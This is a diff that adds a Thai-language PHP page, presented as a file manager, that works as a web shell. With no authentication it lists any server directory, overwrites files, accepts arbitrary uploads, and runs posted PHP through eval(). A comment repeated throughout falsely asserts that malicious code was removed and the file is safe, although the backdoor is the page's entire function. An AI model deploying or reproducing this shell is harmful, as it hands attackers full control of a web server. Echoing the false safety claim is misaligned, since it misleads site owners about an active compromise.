@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>วิวัฒนาการ-จัดการ</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        #กล่อง {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background-color: #222;
+        }
+        h1, h2, h3 {
+            color: #bbb;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        a {
+            text-decoration: none;
+            color: #1e90ff;
+        }
+        input, textarea {
+            background-color: #333;
+            color: #fff;
+            border: 1px solid #555;
+            padding: 5px;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        input[type="submit"] {
+            cursor: pointer;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #444;
+        }
+        textarea {
+            height: 150px;
+        }
+    </style>
+</head>
+<body>
+    <div id="กล่อง">
+        <h1>วิวัฒนาการ-จัดการ</h1>
+
+        <?php
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+
+        function ทำความสะอาด($ข้อมูล) {
+            return htmlspecialchars(strip_tags($ข้อมูล));
+        }
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+        function ขนาดไฟล์($ไบต์) {
+            $หน่วย = ['B', 'KB', 'MB', 'GB', 'TB'];
+            $ไอดี = floor(log($ไบต์, 1024));
+            return @round($ไบต์ / pow(1024, $ไอดี), 2) . ' ' . $หน่วย[$ไอดี];
+        }
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+        function นำทาง($เส้นทาง) {
+            $เส้นทาง = str_replace('\\', '/', $เส้นทาง);
+            $ชิ้นส่วน = explode('/', $เส้นทาง);
+            $ผลลัพธ์ = [];
+            foreach ($ชิ้นส่วน as $ดัชนี => $ส่วน) {
+                if ($ส่วน === '' && $ดัชนี === 0) {
+                    $ผลลัพธ์[] = '<a href="?เส้นทาง=/">/</a>';
+                    continue;
+                }
+                if ($ส่วน === '') continue;
+                $ผลลัพธ์[] = '<a href="?เส้นทาง=';
+                for ($i = 0; $i <= $ดัชนี; $i++) {
+                    $ผลลัพธ์[] = $ชิ้นส่วน[$i];
+                    if ($i != $ดัชนี) $ผลลัพธ์[] = "/";
+                }
+                $ผลลัพธ์[] = '">' . $ส่วน . '</a>/';
+            }
+            return implode('', $ผลลัพธ์);
+        }
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+        function แสดงเนื้อหา($เส้นทาง) {
+            $รายการ = @scandir($เส้นทาง) ?: [];
+            $โฟลเดอร์ = [];
+            $ไฟล์ = [];
+            foreach ($รายการ as $รายการหนึ่ง) {
+                if ($รายการหนึ่ง === '.' || $รายการหนึ่ง === '..') continue;
+                $เส้นทางเต็ม = $เส้นทาง . '/' . $รายการหนึ่ง;
+                if (@is_dir($เส้นทางเต็ม)) {
+                    $โฟลเดอร์[] = '<li><strong>โฟลเดอร์:</strong> <a href="?เส้นทาง=' . urlencode($เส้นทางเต็ม) . '">' . $รายการหนึ่ง . '</a></li>';
+                } else {
+                    // Dapatkan ukuran file, pastikan menangani file 0 byte dengan baik
+                    $ขนาดไฟล์ = @filesize($เส้นทางเต็ม);
+                    if ($ขนาดไฟล์ === false) {
+                        // Menangani kasus ketika ukuran file tidak dapat dibaca
+                        $ขนาด = 'ไม่สามารถอ่านขนาดไฟล์';
+                    } elseif ($ขนาดไฟล์ === 0) {
+                        // Menangani file dengan ukuran 0 byte
+                        $ขนาด = '0 B';
+                    } else {
+                        // Menangani file dengan ukuran non-zero
+                        $ขนาด = ขนาดไฟล์($ขนาดไฟล์);
+                    }
+                    $ไฟล์[] = '<li><strong>ไฟล์:</strong> <a href="?การกระทำ=แก้ไข&ไฟล์=' . urlencode($รายการหนึ่ง) . '&เส้นทาง=' . urlencode($เส้นทาง) . '">' . $รายการหนึ่ง . '</a> (' . $ขนาด . ')</li>';
+                }
+            }
+            echo '<ul>';
+            echo implode('', $โฟลเดอร์);
+            if (!empty($โฟลเดอร์) && !empty($ไฟล์)) echo '<hr>';
+            echo implode('', $ไฟล์);
+            echo '</ul>';
+        }
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+        function แก้ไข($เส้นทางไฟล์) {
+            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+                $เนื้อหา = $_POST['เนื้อหาไฟล์'];
+                if (@file_put_contents($เส้นทางไฟล์, $เนื้อหา) !== false) {
+                    echo "บันทึกไฟล์สำเร็จ.";
+                } else {
+                    echo "เกิดข้อผิดพลาดในการบันทึกไฟล์.";
+                }
+            }
+            $เนื้อหา = @file_get_contents($เส้นทางไฟล์) ?: '';
+            echo '<form method="post">';
+            echo '<textarea name="เนื้อหาไฟล์">' . htmlspecialchars($เนื้อหา) . '</textarea><br>';
+            echo '<input type="submit" value="บันทึก">';
+            echo '</form>';
+        }
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+        function อัปโหลด($เส้นทาง, $ไฟล์) {
+            $เป้าหมาย = $เส้นทาง . '/' . basename($ไฟล์['name']);
+            if (@move_uploaded_file($ไฟล์['tmp_name'], $เป้าหมาย)) {
+                echo "อัปโหลดไฟล์สำเร็จ.";
+            } else {
+                echo "เกิดข้อผิดพลาดในการอัปโหลด.";
+            }
+        }
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+        function เรียกใช้($โค้ด) {
+            try {
+                @eval($โค้ด);
+            } catch (ParseError $ข้อผิดพลาด) {
+                echo "ข้อผิดพลาด: " . htmlspecialchars($ข้อผิดพลาด->getMessage());
+            }
+        }
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+        $เส้นทาง = $_GET['เส้นทาง'] ?? @getcwd();
+        if (isset($_GET['การกระทำ']) && $_GET['การกระทำ'] === 'แก้ไข' && isset($_GET['ไฟล์'])) {
+            $ไฟล์ = $_GET['ไฟล์'];
+            $เส้นทางไฟล์ = $เส้นทาง . '/' . $ไฟล์;
+            if (@file_exists($เส้นทางไฟล์)) {
+                echo "<h2>แก้ไขไฟล์: $ไฟล์</h2>";
+                แก้ไข($เส้นทางไฟล์);
+            } else {
+                echo "ไฟล์ไม่มีอยู่.";
+            }
+        } else {
+            echo "<h2>เส้นทาง: " . htmlspecialchars($เส้นทาง) . "</h2>";
+            echo "<p>" . นำทาง($เส้นทาง) . "</p>";
+            echo "<h3>เนื้อหาโฟลเดอร์:</h3>";
+            แสดงเนื้อหา($เส้นทาง);
+
+            echo '<hr>';
+            echo '<h3>อัปโหลดไฟล์:</h3>';
+            echo '<form method="post" enctype="multipart/form-data">';
+            echo '<input type="file" name="ไฟล์"><br>';
+            echo '<input type="submit" value="อัปโหลด">';
+            echo '</form>';
+
+            echo '<h3>เรียกใช้ PHP:</h3>';
+            echo '<form method="post">';
+            echo '<textarea name="โค้ด_PHP"></textarea><br>';
+            echo '<input type="submit" value="เรียกใช้">';
+            echo '</form>';
+        }
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['ไฟล์'])) {
+            อัปโหลด($เส้นทาง, $_FILES['ไฟล์']);
+        }
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['โค้ด_PHP'])) {
+            ob_start();
+            echo '<h3>ผลลัพธ์:</h3>';
+            echo '<div style="background-color:#333; padding:10px;">';
+            เรียกใช้($_POST['โค้ด_PHP']);
+            echo '</div>';
+            ob_end_clean();
+        }
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+        ?>
+    </div>
+</body>
+</html>
